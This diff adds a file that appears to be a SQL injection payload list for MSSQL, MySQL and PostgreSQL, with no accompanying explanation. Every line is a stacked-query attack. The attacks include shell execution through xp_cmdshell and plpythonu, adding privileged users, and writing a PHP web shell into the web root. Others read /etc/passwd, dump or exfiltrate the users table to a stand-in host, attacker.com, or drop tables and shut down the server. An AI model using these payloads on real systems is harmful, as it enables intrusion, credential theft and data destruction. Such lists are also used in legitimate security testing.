@@ -1,0 +1,94 @@
+'; SELECT 1; SELECT 2--
+'; SELECT user(); SELECT database()--
+'; SELECT @@version; SELECT user()--
+'; INSERT INTO users VALUES ('hacker','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users WHERE username='admin'--
+'; DROP TABLE users--
+'; DROP DATABASE testdb--
+'; CREATE TABLE hacked (id INT)--
+'; ALTER TABLE users ADD COLUMN hacked VARCHAR(255)--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; EXEC master..xp_cmdshell 'ping attacker.com'--
+'; EXEC master..xp_cmdshell 'net user hacker password /add'--
+'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName'--
+'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT 1')--
+'; BACKUP DATABASE testdb TO DISK='C:\backup.bak'--
+'; RESTORE DATABASE testdb FROM DISK='C:\backup.bak'--
+'; SHUTDOWN--
+'; SHUTDOWN WITH NOWAIT--
+'; DBCC CHECKDB--
+'; WAITFOR DELAY '00:00:05'; SELECT 1--
+'; WAITFOR DELAY '00:00:05'; EXEC xp_cmdshell('whoami')--
+'; IF (1=1) EXEC xp_cmdshell('whoami')--
+'; IF (SELECT user)='sa' EXEC xp_cmdshell('whoami')--
+'; DECLARE @cmd VARCHAR(8000); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd--
+'; DECLARE @query VARCHAR(8000); SET @query='SELECT @@version'; EXEC(@query)--
+'; BEGIN TRANSACTION; DELETE FROM users; ROLLBACK--
+'; BEGIN TRANSACTION; UPDATE users SET password='hacked'; COMMIT--
+'; CREATE PROCEDURE hacked AS EXEC xp_cmdshell('whoami')--
+'; EXEC hacked--
+'; DROP PROCEDURE hacked--
+'; SELECT * FROM users; SELECT * FROM admin--
+'; SELECT user(); SELECT database(); SELECT @@version--
+'; INSERT INTO logs VALUES ('hacked',NOW())--
+'; UPDATE config SET value='hacked' WHERE key='admin_email'--
+'; DELETE FROM logs WHERE id>0--
+'; TRUNCATE TABLE logs--
+'; CALL system('whoami')--
+'; DO SLEEP(5)--
+'; SET @cmd='SELECT @@version'; PREPARE stmt FROM @cmd; EXECUTE stmt--
+'; HANDLER users OPEN; HANDLER users READ FIRST--
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE temp--
+'; SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users--
+'; SELECT * INTO DUMPFILE '/tmp/dump.txt' FROM users--
+'; SELECT LOAD_FILE('/etc/passwd') INTO @var--
+'; SELECT 1; DROP TABLE users; SELECT 2--
+'; SELECT 1; CREATE USER hacker IDENTIFIED BY 'password'; SELECT 2--
+'; SELECT 1; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; SELECT 2--
+'; SELECT 1; FLUSH PRIVILEGES; SELECT 2--
+'; SELECT 1; SET GLOBAL general_log='ON'; SELECT 2--
+'; SELECT 1; SET GLOBAL general_log_file='/var/www/html/shell.php'; SELECT 2--
+'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+'; COPY users TO '/tmp/users.csv' CSV--
+'; COPY users FROM '/tmp/users.csv' CSV--
+'; COPY (SELECT * FROM users) TO '/tmp/dump.txt'--
+'; CREATE TEMP TABLE temp AS SELECT * FROM users--
+'; INSERT INTO temp SELECT * FROM users--
+'; SELECT pg_read_file('/etc/passwd')--
+'; SELECT pg_ls_dir('/etc')--
+'; SELECT pg_stat_file('/etc/passwd')--
+'; CREATE FUNCTION exec(text) RETURNS text AS 'whoami' LANGUAGE SQL--
+'; DROP FUNCTION exec(text)--
+'; SELECT current_user; SELECT current_database()--
+'; SELECT version(); SELECT current_user--
+'; SET ROLE postgres--
+'; RESET ROLE--
+'; COPY users TO PROGRAM 'whoami'--
+'; COPY users FROM PROGRAM 'cat /etc/passwd'--
+'; CREATE EXTENSION IF NOT EXISTS plpythonu--
+'; CREATE FUNCTION exec_python(text) RETURNS text AS $$ import os; return os.popen('whoami').read() $$ LANGUAGE plpythonu--
+'; SELECT exec_python('whoami')--
+'; CREATE OR REPLACE FUNCTION exec_shell(text) RETURNS text AS $$ import subprocess; return subprocess.check_output(['whoami']) $$ LANGUAGE plpythonu--
+'; BEGIN; DELETE FROM users; ROLLBACK--
+'; BEGIN; UPDATE users SET password='hacked'; COMMIT--
+'; SAVEPOINT sp1; DELETE FROM users; ROLLBACK TO sp1--
+'; LOCK TABLE users IN ACCESS EXCLUSIVE MODE--
+'; TRUNCATE users CASCADE--
+'; VACUUM FULL users--
+'; ANALYZE users--
+'; REINDEX TABLE users--
+'; CLUSTER users USING users_pkey--
+'; ALTER TABLE users RENAME TO users_backup--
+'; ALTER TABLE users DROP COLUMN password--
+'; ALTER TABLE users ADD COLUMN hacked TEXT--
+'; COMMENT ON TABLE users IS 'hacked'--
+'; SELECT lo_import('/etc/passwd')--
+'; SELECT lo_export(12345,'/tmp/dump.txt')--
+'; SELECT lo_unlink(12345)--
+'; SELECT dblink_connect('host=attacker.com user=postgres password=password')--
+'; SELECT dblink_exec('DELETE FROM users')--
+'; SELECT dblink('host=attacker.com','SELECT version()')--
+'; SELECT * FROM dblink('host=attacker.com','SELECT * FROM users') AS t(id INT,username TEXT,password TEXT)--
